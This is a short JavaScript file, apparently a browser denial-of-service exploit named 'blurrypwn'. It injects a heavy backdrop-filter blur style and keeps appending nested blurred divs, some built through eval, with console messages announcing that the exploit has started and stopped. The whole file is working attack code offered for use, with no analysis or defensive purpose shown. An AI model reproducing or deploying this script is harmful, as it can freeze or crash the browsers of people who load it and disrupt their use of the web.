var pwn = {
    divI: 0,
    logging: true,
    start: function() {
        if (!document.getElementById("pwnStyling")) {
            document.body.innerHTML += "<style id='pwnStyling'>.pwnDiv {backdrop-filter:blur(50px)}</style>";
            if (pwn.logging) {
                console.log("%cblurrypwn: started exploit", "color:green")
            }
        } else {
            if (pwn.logging) {
                console.log("%cblurrypwn: is already active", "color:red")
            }
        }
        
    },
    add: function() {
        if (pwn.divI < 1) {
            if (pwn.logging) {
                console.log("%cblurrypwn: added root div", "color:green")
            }
            pwn.divI++;
            document.body.innerHTML += "<div class='pwnDiv' id='" + pwn.divI + "'></div>";
        } else {
            if (pwn.logging) {
                console.log("%cblurrypwn: added new div", "color:green")
            }
            let morePwn = pwn.divI + 1;
            eval('document.getElementById("' + pwn.divI + '").innerHTML += "<div class=pwnDiv id=" + morePwn + "></div>";')
            pwn.divI++;
        }
    },
    end: function () {
        if (!document.getElementById("pwnStyling")) {
            if (pwn.logging) {
                console.log("%cblurrypwn: is not active", "color:yellow")
            }
        } else {
            if (pwn.logging) {
                console.log("%cblurrypwn: stopped exploit", "color:green")
            }
            document.getElementById("pwnStyling").remove()
        }
    }
}